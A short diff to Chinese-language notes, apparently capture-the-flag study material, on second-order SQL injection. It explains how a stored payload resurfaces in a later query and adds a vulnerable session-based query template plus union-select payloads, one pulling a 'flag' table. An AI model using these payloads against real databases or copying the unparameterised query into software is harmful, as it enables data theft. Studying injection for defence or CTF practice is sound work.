@@ -97,7 +97,7 @@ print("All:", column)
 ## **二次注入**
 
 往往可以注册，先把payload注入数据库，
-再在另一个页面，如查询详细资料，修改信息提交前等，会查询出来并二次直接查询数据库，造成二次注入。
+再在另一个页面，如查询详细资料，修改信息提交前等，会查询出来直接或放入session作为参数二次查询数据库，造成二次注入。
 一般是报错回显。
 ```
 and or 被过滤，使用||，&&，^等
@@ -123,7 +123,10 @@ and or 被过滤，使用||，&&，^等
 ```
 部分题使用联合注入回显
 ```
+select info from users where username='{$_SESSION['username']}
+
 1' union select database() #
+1' union select flag from flag #
 ```
 
 ^
